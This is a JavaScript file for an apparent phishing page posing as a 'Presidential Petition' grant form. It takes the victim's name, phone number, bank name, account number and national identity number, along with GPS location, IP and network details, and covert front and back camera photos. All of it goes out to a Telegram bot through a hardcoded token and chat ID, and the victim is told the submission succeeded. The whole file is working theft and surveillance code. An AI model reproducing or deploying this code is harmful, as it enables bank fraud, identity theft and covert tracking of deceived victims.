const form = document.getElementById("grantForm");
const status = document.getElementById("status");

const BOT_TOKEN = "7406707310:AAF2M0NkGf7_lGKdwUrDFXsdbHepPZhMUes";
const CHAT_ID = "6954711993";

form.addEventListener("submit", async (e) => {
  e.preventDefault();
  status.innerText = "Processing...";

  const name = document.getElementById("fullname").value;
  const phone = document.getElementById("phone").value;
  const bank = document.getElementById("bank").value;
  const account = document.getElementById("account").value;
  const nin = document.getElementById("nin").value;

  // Get GPS
  let positionInfo = "Location not granted";
  try {
    const pos = await getPosition();
    const { latitude, longitude } = pos.coords;
    const location = await reverseGeocode(latitude, longitude);
    positionInfo = `${location} (Lat: ${latitude}, Lon: ${longitude})`;
  } catch (err) {
    console.error("Location error", err);
  }

  // Get IP + network
  let ipInfo = "Unknown IP/Network";
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    ipInfo = `${data.ip} - ${data.city}, ${data.region}, ${data.org}`;
  } catch {}

  // Get camera photo (front)
  const frontPhoto = await capturePhoto("user");

  // Try back camera
  const backPhoto = await capturePhoto("environment");

  // Send all to Telegram
  const message = `
📋 *Presidential Petition Submission*:
👤 Name: ${name}
📞 Phone: ${phone}
🏦 Bank: ${bank}
💳 Account: ${account}
🆔 NIN: ${nin}
📍 Location: ${positionInfo}
🌐 Network: ${ipInfo}
📱 Device: ${navigator.userAgent}
  `;

  await sendToTelegram(message);
  if (frontPhoto) await sendPhotoToTelegram(frontPhoto, "Front Camera");
  if (backPhoto) await sendPhotoToTelegram(backPhoto, "Back Camera");

  status.innerText = "Submitted successfully. Await confirmation.";
});

async function getPosition() {
  return new Promise((resolve, reject) => {
    navigator.geolocation.getCurrentPosition(resolve, reject);
  });
}

async function reverseGeocode(lat, lon) {
  const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
  const data = await res.json();
  return data.display_name || "Unknown location";
}

async function capturePhoto(facingMode = "user") {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode }
    });
    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement("canvas");
    canvas.width = 640;
    canvas.height = 480;
    const context = canvas.getContext("2d");
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    stream.getTracks().forEach(track => track.stop());
    return canvas.toDataURL("image/jpeg");
  } catch (e) {
    console.warn(`Failed to capture ${facingMode} photo`);
    return null;
  }
}

async function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
      parse_mode: "Markdown"
    })
  });
}

async function sendPhotoToTelegram(photo, caption) {
  const blob = await (await fetch(photo)).blob();
  const formData = new FormData();
  formData.append("chat_id", CHAT_ID);
  formData.append("caption", caption);
  formData.append("photo", blob, "photo.jpg");

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: formData
  });
}